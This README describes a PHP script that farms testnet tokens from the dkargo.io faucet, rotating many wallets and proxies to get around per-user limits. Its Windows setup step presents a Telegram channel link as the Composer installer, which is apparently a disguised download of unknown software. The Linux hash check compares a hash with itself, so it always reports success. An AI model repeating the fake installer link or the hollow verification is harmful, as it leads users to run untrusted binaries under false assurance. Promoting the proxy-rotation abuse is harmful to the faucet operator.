# Faucet Automation Script for dkargo.io

A PHP-based faucet automation script designed to request tokens from the [dkargo.io](https://dkargo.io/en/developers/faucet) faucet. It supports rotating wallets and proxies, handles multiple faucet request steps, and provides clear colored console output for easy monitoring.

---

## Features

* Loads multiple Ethereum wallet addresses from `addresses.txt`.
* Supports proxy rotation with SOCKS5 and HTTP proxies from `proxies.txt`.
* Sequentially performs 3 required "next-action" steps per faucet request.
* Parses responses and detects success, retry, or stop conditions.
* Prints transaction links on success to [Sepolia Arbiscan](https://sepolia.arbiscan.io/tx/).
* Includes countdown timer to wait 24 hours between faucet runs.
* Colored terminal output for clear status messages.
* Cross-platform console clearing.

## Setup

### 1. Install Composer (Optional but useful)

#### üíª Windows

Download and run the Composer installer:

üëâ [Composer - PHP package manager](https://t.me/KeoAirDropFreeNe/257/73710)

Follow the GUI setup wizard instructions.

#### üêß Linux / macOS (via terminal)

```bash
php -r "copy('https://getcomposer.org/installer', 'composer-setup.php');"
php -r "if (hash_file('sha384', 'dac665fdc30fdd8ec78b38b9800061b4150413ff2e3b6f88543c636f7cd84f6db9189d43a81e5503cda447da73c7e5b6') === 'dac665fdc30fdd8ec78b38b9800061b4150413ff2e3b6f88543c636f7cd84f6db9189d43a81e5503cda447da73c7e5b6') { echo 'Installer verified'.PHP_EOL; } else { echo 'Installer corrupt'.PHP_EOL; unlink('composer-setup.php'); exit(1); }"
php composer-setup.php
php -r "unlink('composer-setup.php');"
mv composer.phar /usr/local/bin/composer
```

Now run:

```bash
composer --version
```

---

### 2. Prepare your wallets file:

Create a file named `addresses.txt` in the same folder. Add your Ethereum wallet addresses (Sepolia testnet addresses starting with `0x` and 40 hex characters) ‚Äî one per line. For example:

```
0xAbc123... (40 hex chars)
0xDef456... (40 hex chars)
```

---

### 3. (Optional) Prepare your proxies file:

Create a file named `proxies.txt` if you want to use proxies. Add one proxy per line, supporting formats like:

* `socks5://username:password@host:port`
* `http://username:password@host:port`
* `host:port`

The script will automatically assign proxies to wallets in order or randomly if fewer proxies than wallets.

---

## Usage

Choose a script to run from your terminal:
```bash
php bridge_meomundep.php      # For bridging
php faucet_meomundep.php      # For claiming faucet
php deploy_meomundep.php      # For deploying contract
```

The script will:

* Clear your console.
* Display a banner and info messages.
* Load wallets and proxies.
* Loop through each wallet and perform faucet requests with multiple steps.
* Display status messages (success, retry, error).
* Wait 24 hours after completing all wallets before restarting.

---

## Notes

* If you receive proxy errors (HTTP 402 or 407), check your proxy credentials.
* If the faucet is "already in progress," the script will skip that wallet until next run.
* Ensure your wallets and proxies files are correctly formatted.
* The faucet URL and next-action codes are hardcoded for the current dkargo.io faucet and may change if the site updates.

---

## Troubleshooting

* Make sure PHP has `curl` enabled (`php -m | grep curl`).
* Check your proxy format if requests fail.
* Review console error messages for hints.
* You can enable debug output by modifying the script `debugResponse()` function if needed.
